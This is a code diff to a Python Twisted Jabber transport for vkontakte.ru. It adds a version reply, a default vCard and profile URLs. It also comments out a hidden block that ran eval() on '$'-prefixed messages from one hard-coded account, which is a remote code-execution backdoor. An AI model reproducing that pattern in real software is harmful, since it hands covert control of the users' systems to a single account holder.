@@ -106,12 +106,13 @@ class pyvk_t(component.Service,vkonClient):
                     d.addCallback(self.sendFriendlist,jid=bjid)
 
             return
-        if (body[0:1]=="$" and bjid=="eqx@eqx.su"):
-            try:
-                eval(body[1:])
-            except:
-                log.msg("eval('%s') failed"%body)
-            return
+
+        #if (body[0:1]=="$" and bjid=="eqx@eqx.su"):
+            #try:
+                #eval(body[1:])
+            #except:
+                #log.msg("eval('%s') failed"%body)
+            #return
         if(msg["to"]!=self.jid and self.threads.has_key(bjid)):
             dogpos=msg["to"].find("@")
             try:
@@ -152,6 +153,12 @@ class pyvk_t(component.Service,vkonClient):
                     q.addElement("password")
                     ans.send()
                     return
+                elif (query.uri=="jabber:iq:version"):
+                    q.addElement("name").addContent("pyvk-t [twisted]")
+                    q.addElement("version").addContent("svn")
+                    ans.send()
+                    return
+                    
             vcard=iq.vCard
             if (vcard):
                 #log.msg("vcard request")
@@ -169,6 +176,16 @@ class pyvk_t(component.Service,vkonClient):
                             return
                         else:
                             log.msg("thread not found!")
+                else:
+                    ans=xmlstream.IQ(self.xmlstream,"result")
+                    ans["to"]=iq["from"]
+                    ans["from"]=iq["to"]
+                    ans["id"]=iq["id"]
+                    q=ans.addElement("vCard","vcard-temp")
+                    q.addElement("FN").addContent("vkontakte.ru transport")
+                    ans.send()
+                    return
+                    
         if (iq["type"]=="set"):
             query=iq.query
             if (query):
@@ -269,6 +286,7 @@ class pyvk_t(component.Service,vkonClient):
             if (type(card["fn"]!=unicode)):
                 card["fn"]=card["fn"].decode("utf-8")
             vc.addElement("NICKNAME").addContent(card["fn"])
+        vc.addElement("URL").addContent("http://vkontakte.ru/id%s"%v_id)
         ans.send()
         #log.msg(ans.toXml())
     def requestMessage(self,jid,msgid):
